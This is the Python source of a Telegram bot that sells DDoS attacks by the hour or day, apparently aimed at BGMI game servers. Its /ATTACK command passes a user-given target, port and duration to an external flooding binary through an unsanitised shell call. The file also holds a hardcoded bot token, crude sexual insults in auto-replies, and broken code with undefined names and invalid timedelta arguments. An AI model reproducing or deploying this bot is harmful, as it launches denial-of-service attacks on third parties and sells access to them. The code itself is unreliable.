import telebot
#_________________________________________________________________________________________________________________________________________________
import subprocess
#_________________________________________________________________________________________________________________________________________________
import datetime
#_________________________________________________________________________________________________________________________________________________
import os
#_________________________________________________________________________________________________________________________________________________
bot = telebot.TeleBot('7278781816:AAEuRI5I-zMcrdJ9-Tq09cLsqAiUzcmNrKo')
#_________________________________________________________________________________________________________________________________________________
admin_id = ["6480787990"]
#_________________________________________________________________________________________________________________________________________________
USER_FILE = "users.txt"                             
LOG_FILE = "log.txt"
#_________________________________________________________________________________________________________________________________________________
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
#_________________________________________________________________________________________________________________________________________________
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass
#_________________________________________________________________________________________________________________________________________________
allowed_user_ids = read_users()
#_________________________________________________________________________________________________________________________________________________
def log_command(user_id, target, port, time):
    admin_id = ["6769245930"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
#_________________________________________________________________________________________________________________________________________________
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"               
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")
#_________________________________________________________________________________________________________________________________________________
import datetime

user_approval_expiry = {}

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.D < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"
#_________________________________________________________________________________________________________________________________________________
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(H=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(D=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(W=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(D=30 * duration)  
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['JOIN'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()   
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]
#_________________________________________________________________________________________________________________________________________________
            try:
                duration = int(duration_str[:-4])  
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝙅𝙊𝙄𝙉𝙀𝘿 ✅"
                bot.reply_to(message, response)
                return
#_________________________________________________________________________________________________________________________________________________
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"𝙅𝙊𝙄𝙉𝙀𝘿 ✅"
                else:
                    response = "🚫 𝙏𝙍𝙔 𝘼𝙂𝘼𝙄𝙉 🚫"
            else:
                response = "𝘼𝙇𝙍𝙀𝘼𝘿𝙔 𝙅𝙊𝙄𝙉𝙀𝘿 🔥"
        else:
            response = "🚫 𝙏𝙍𝙔 𝘼𝙂𝘼𝙄𝙉 🚫"
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐 --> @VIP_DDoS_SELLER"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['REMOVE'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝗥𝗘𝗠𝗢𝗩𝗘𝗗 ❌"
            else:
                response = f"𝙐𝙎𝙀𝙍 𝙉𝙊𝙏 𝙁𝙊𝙐𝙉𝘿‼️"
        else:
            response = '''🚫 𝙏𝙍𝙔 𝘼𝙂𝘼𝙄𝙉 🚫'''
    else:
        response = "𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙉𝙊𝙏 𝙔𝙊𝙐 --> @VIP_DDoS_SELLER"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
#_________________________________________________________________________________________________________________________________________________
    response = f"🦇★⃝𝑨𝑻𝑻𝑨𝑪𝑲★⃝ 🦇"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
bgmi_cooldown = {}
#_________________________________________________________________________________________________________________________________________________
COOLDOWN_TIME =15
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['ATTACK'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
                if time_since_last_attack < 300:
                    remaining_time = 300 - time_since_last_attack
                    response = f"𝙒𝘼𝙄𝙏 𝙁𝙊𝙍 𝙉𝙀𝙒 𝘼𝙏𝙏𝘼𝘾𝙆 \n𝙂𝙀𝙉𝙀𝙍𝘼𝙏𝙀𝘿 𝘾𝙊𝙊𝙇 𝘿𝙊𝙒𝙉 𝙎𝙀𝘾𝙊𝙉𝘿 --> {remaining_time} \n𝘽𝙀𝙁𝙊𝙍𝙀 𝙎𝙀𝙉𝘿 𝙉𝙀𝙒 𝘼𝙏𝙏𝘼𝘾𝙆"
                    bot.reply_to(message, response)
                return
#_________________________________________________________________________________________________________________________________________________
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            target = command[1]
            port = int(command[2])  
            time = int(command[3]) 
            if time > 240:
                response = "𝐥𝐞𝐬𝐬 𝐭𝐡𝐚𝐧 𝟐𝟒𝟎"
            else:
                record_command_logs(user_id, '/ATTACK', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time) 
                full_command = f"./S4 {target} {port} {time} 40"
                process = subprocess.run(full_command, shell=True)
                response = f"🦇★⃝ ₣ƗŇƗŞĦ€Đ★⃝ 🦇"
                bot.reply_to(message, response)  
        else:
            response = "𝙍𝙀𝘼𝘿𝙔 𝙏𝙊 𝙐𝙎𝙀" 
    else:
        response = ("🚩 @VIP_DDoS_SELLE 🚩")
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''♡▪︎•𝗦𝟜•▪︎♡𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑\n༒͢\n♥⃝🅾ғͥғɪᴄͣɪͫᴀʟ༒Ď𝕯𝖔𝚂᭄🅺ιиg✍\n\n★ 𝙂𝙀𝙏 𝙋𝙇𝘼𝙉 --> /PLAN \n★ 𝙉𝙀𝙀𝘿 𝙃𝙀𝙇𝙋 --> /OWNER \n★ 𝘼𝙏𝙏𝘼𝘾𝙆 --> /𝘼𝙏𝙏𝘼𝘾𝙆 \n★ 𝙈𝘼𝙄𝙉 𝙂𝙍𝙊𝙐𝙋 --> /MAIN\n★ 𝘽𝙂𝙈𝙄 𝙃𝘼𝘾𝙆𝙎 --> /HACK\n\n𝙇𝙀𝘼𝙑𝙀 𝘼𝙉𝘿 𝙔𝙊𝙐𝙍 𝙇𝙊𝙎𝙎'''
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "PLAN":
        bot.reply_to(message, "*𝐒𝟒 𝐕𝐈𝐏 𝐌𝐄𝐌𝐁𝐄𝐑𝐒𝐇𝐈𝐏☠️ \n\n𝐍𝐎𝐓 - 𝟐𝟒/𝟕 𝐎𝐖𝐍𝐄𝐑 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 🔻 \n✪ 𝟏 𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 --> 𝟐𝟎₹ \n✪ 𝟐𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟑𝟎₹ \n✪ 𝟏𝐃𝐀𝐘 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟏𝟏𝟎₹ \n✪ 𝟑𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟐𝟓𝟎₹ \n✪ 𝟕𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟓𝟓𝟎₹\n\n𝙄𝙁 𝙈𝙄𝙎𝙎 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝘿𝙄𝙍𝙀𝘾𝙏 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙊𝙒𝙉𝙀𝙍 🚩*", parse_mode='Markdown')
    elif message.text == "ATTACK":
        attack_command(message)
    elif message.text == "OWNER":
        bot.send_message(message.chat.id, "*𝐘𝐨𝐮 𝐆𝐞𝐭 𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 --> @VIP_DDoS_SELLER \n𝐁𝐮𝐭 𝐒𝐞𝐲 𝐎𝐧𝐥𝐲 𝐄𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧 𝐏𝐮𝐫𝐩𝐨𝐬𝐞 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐘𝐨𝐮 𝐆𝐞𝐭 𝐎𝐧𝐥𝐲 𝐁𝐥𝐨𝐜𝐤 𝐋𝐢𝐬𝐭*", parse_mode='Markdown')
    elif message.text == "Buy":
        bot.send_message(message.chat.id, "*𝐒𝟒 𝐕𝐈𝐏 𝐌𝐄𝐌𝐁𝐄𝐑𝐒𝐇𝐈𝐏☠️ \n\n𝐍𝐎𝐓 - 𝟐𝟒/𝟕 𝐎𝐖𝐍𝐄𝐑 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 🔻 \n✪ 𝟏 𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 --> 𝟐𝟎₹ \n✪ 𝟐𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟑𝟎₹ \n✪ 𝟏𝐃𝐀𝐘 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟏𝟏𝟎₹ \n✪ 𝟑𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟐𝟓𝟎₹ \n✪ 𝟕𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟓𝟓𝟎₹\n\n𝙄𝙁 𝙈𝙄𝙎𝙎 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝘿𝙄𝙍𝙀𝘾𝙏 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙊𝙒𝙉𝙀𝙍 🚩*", parse_mode='Markdown')
    elif message.text == "Not":
        bot.send_message(message.chat.id, "*𝙏𝙊 𝙈𝙏 𝙆𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝘼𝙂𝙀𝙍 𝙒𝙊𝙍𝙆 𝙉𝙃𝙄 𝙆𝙍 𝙍𝙃𝘼 𝙏𝙊 𝘽𝘾🤬*", parse_mode='Markdown')   
    elif message.text == "DM":
        bot.send_message(message.chat.id, "*@VIP_DDoS_SELLE*", parse_mode='Markdown')    
    elif message.text == "Thanks":
        bot.send_message(message.chat.id, "*𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙈𝙀𝙍𝙄 𝙅𝘼𝘼𝙉 ❤️*", parse_mode='Markdown')   
    elif message.text == "/HACK":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "/MAIN":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')    
    elif message.text == "NOT":
        bot.send_message(message.chat.id, "*𝙏𝙊 𝙈𝙏 𝙆𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝘼𝙂𝙀𝙍 𝙒𝙊𝙍𝙆 𝙉𝙃𝙄 𝙆𝙍 𝙍𝙃𝘼 𝙏𝙊 𝘽𝘾🤬*", parse_mode='Markdown')    
    elif message.text == "on":
        bot.send_message(message.chat.id, "*𝘼𝘽𝙃𝙄 𝙏𝙤 𝙐𝙎𝙀 𝙆𝙍 𝙇𝙀 𝙈𝙀𝙍𝙀 𝘽𝙃𝘼𝙄*", parse_mode='Markdown')    
    elif message.text == "Not working":
        bot.send_message(message.chat.id, "*𝙏𝙊 𝙈𝙏 𝙆𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝘼𝙂𝙀𝙍 𝙒𝙊𝙍𝙆 𝙉𝙃𝙄 𝙆𝙍 𝙍𝙃𝘼 𝙏𝙊 𝘽𝘾🤬*", parse_mode='Markdown')       
    elif message.text == "Not Working":
        bot.send_message(message.chat.id, "*𝙏𝙊 𝙈𝙏 𝙆𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝘼𝙂𝙀𝙍 𝙒𝙊𝙍𝙆 𝙉𝙃𝙄 𝙆𝙍 𝙍𝙃𝘼 𝙏𝙊 𝘽𝘾🤬*", parse_mode='Markdown')      
    elif message.text == "Chutiya":
        bot.send_message(message.chat.id, "*𝙏𝙀𝙍𝙄 𝙈𝘼𝘼 𝙆𝙄 𝘾𝙃𝙐𝙏 𝙇𝘼𝙒𝘿𝙀 𝙊𝙍 𝙏𝙀𝙍𝙄 𝘽𝘼𝙃𝘼𝙉 𝙆𝙊 𝙂𝙃𝙊𝘿𝙄 𝘽𝙉𝘼𝙆𝙀 𝙆𝙀 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝙐𝙉𝙂𝘼*", parse_mode='Markdown')       
    elif message.text == "Acha h":
        bot.send_message(message.chat.id, "*𝙏𝙃𝘼𝙉𝙆𝙎 🙏*", parse_mode='Markdown')        
    elif message.text == "S4":
        bot.send_message(message.chat.id, "*𝘽𝙐𝙎𝙔 𝙍𝙄𝙂𝙃𝙏 𝙉𝙊𝙒 𝘾𝙊𝙈𝙀 𝙄𝙉 𝘿𝙈 𝘼𝙉𝘿 𝙒𝘼𝙄𝙏 𝙁𝙊𝙍 𝙍𝙀𝙋𝙇𝙔*", parse_mode='Markdown')         
    elif message.text == "Luchi":
        bot.send_message(message.chat.id, "*𝘽𝙐𝙎𝙔 𝙍𝙄𝙂𝙃𝙏 𝙉𝙊𝙒 𝘾𝙊𝙈𝙀 𝙄𝙉 𝘿𝙈 𝘼𝙉𝘿 𝙒𝘼𝙄𝙏 𝙁𝙊𝙍 𝙍𝙀𝙋𝙇𝙔*", parse_mode='Markdown')          
    elif message.text == "Free":
        bot.send_message(message.chat.id, "*𝙈𝙐𝙅𝙀 𝘽𝙃𝙄 𝘿𝙀 𝘿𝙀 𝙔𝙧𝙧 𝙁𝙍𝙀𝙀 𝙃 𝙏𝙊*", parse_mode='Markdown')           
    elif message.text == "free":
        bot.send_message(message.chat.id, "*𝙈𝙐𝙅𝙀 𝘽𝙃𝙄 𝘿𝙀 𝘿𝙀 𝙔𝙧𝙧 𝙁𝙍𝙀𝙀 𝙃 𝙏𝙊*", parse_mode='Markdown')          
    elif message.text == "HACK":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "MAIN":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')      
    elif message.text == "Join":
        bot.send_message(message.chat.id, "*https://t.me/lalu_op_cnl*", parse_mode='Markdown')    
    elif message.text == "join":
        bot.send_message(message.chat.id, "*https://t.me/S4xOFFICIALxGRP*", parse_mode='Markdown')    
    elif message.text == "/OWNER":
        bot.send_message(message.chat.id, "*𝐘𝐨𝐮 𝐆𝐞𝐭 𝐎𝐰𝐧𝐞𝐫 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 --> @VIP_DDoS_SELLER \n𝐁𝐮𝐭 𝐒𝐞𝐲 𝐎𝐧𝐥𝐲 𝐄𝐝𝐮𝐜𝐚𝐭𝐢𝐨𝐧 𝐏𝐮𝐫𝐩𝐨𝐬𝐞 𝐎𝐭𝐡𝐞𝐫𝐰𝐢𝐬𝐞 𝐘𝐨𝐮 𝐆𝐞𝐭 𝐎𝐧𝐥𝐲 𝐁𝐥𝐨𝐜𝐤 𝐋𝐢𝐬𝐭*", parse_mode='Markdown')    
    elif message.text == "/PLAN":
        bot.send_message(message.chat.id, "*𝐒𝟒 𝐕𝐈𝐏 𝐌𝐄𝐌𝐁𝐄𝐑𝐒𝐇𝐈𝐏☠️ \n\n𝐍𝐎𝐓 - 𝟐𝟒/𝟕 𝐎𝐖𝐍𝐄𝐑 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 🔻 \n✪ 𝟏 𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 --> 𝟐𝟎₹ \n✪ 𝟐𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟑𝟎₹ \n✪ 𝟏𝐃𝐀𝐘 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟏𝟏𝟎₹ \n✪ 𝟑𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟐𝟓𝟎₹ \n✪ 𝟕𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟓𝟓𝟎₹\n\n𝙄𝙁 𝙈𝙄𝙎𝙎 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝘿𝙄𝙍𝙀𝘾𝙏 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙊𝙒𝙉𝙀𝙍 🚩*", parse_mode='Markdown')    
    elif message.text == "plan":
        bot.send_message(message.chat.id, "*𝐒𝟒 𝐕𝐈𝐏 𝐌𝐄𝐌𝐁𝐄𝐑𝐒𝐇𝐈𝐏☠️ \n\n𝐍𝐎𝐓 - 𝟐𝟒/𝟕 𝐎𝐖𝐍𝐄𝐑 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 🔻 \n✪ 𝟏 𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 --> 𝟐𝟎₹ \n✪ 𝟐𝐇𝐎𝐔𝐑 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟑𝟎₹ \n✪ 𝟏𝐃𝐀𝐘 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟏𝟏𝟎₹ \n✪ 𝟑𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟐𝟓𝟎₹ \n✪ 𝟕𝐃𝐀𝐘𝐒 𝐆𝐄𝐓 𝐎𝐍𝐋𝐘 𝟓𝟓𝟎₹\n\n𝙄𝙁 𝙈𝙄𝙎𝙎 𝘼𝙉𝙔 𝘼𝙏𝙏𝘼𝘾𝙆 𝘿𝙄𝙍𝙀𝘾𝙏 𝘾𝙊𝙉𝙏𝘼𝘾𝙏 𝙊𝙒𝙉𝙀𝙍 🚩*", parse_mode='Markdown')    
    else:
        bot.reply_to(message, "*𝘽𝘼𝙆𝘾𝙃𝙊𝘿𝙄 𝙈𝙏 𝙆𝙍 𝙇𝘼𝙒𝘿𝙀*", parse_mode='Markdown')
#_________________________________________________________________________________________________________________________________________________
@bot.message_handler(commands=['NOTIFY'])
#_________________________________________________________________________________________________________________________________________________
def NOTIFY_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_NOTIFY = "✉️ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ✉️" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_NOTIFY)
                    except Exception as e:
                        print(f"❌ 𝙁𝘼𝙄𝙇𝙀𝘿 ❌")
            response = "✅ 𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙉𝙊𝙏𝙄𝙁𝙄𝘾𝘼𝙏𝙄𝙊𝙉 ✅"
        else:
            response = "𝙏𝙔𝙋𝙀 𝘼 𝙉𝙊𝙏𝙄𝙁𝙄𝘾𝘼𝙏𝙄𝙊𝙉 𝙈𝘼𝙎𝙎𝘼𝙂𝙀"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐅𝐎𝐑 𝐎𝐖𝐍𝐄𝐑"
#_________________________________________________________________________________________________________________________________________________
    bot.reply_to(message, response)
#_________________________________________________________________________________________________________________________________________________
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
#_________________________________________________________________________________________________________________________________________________
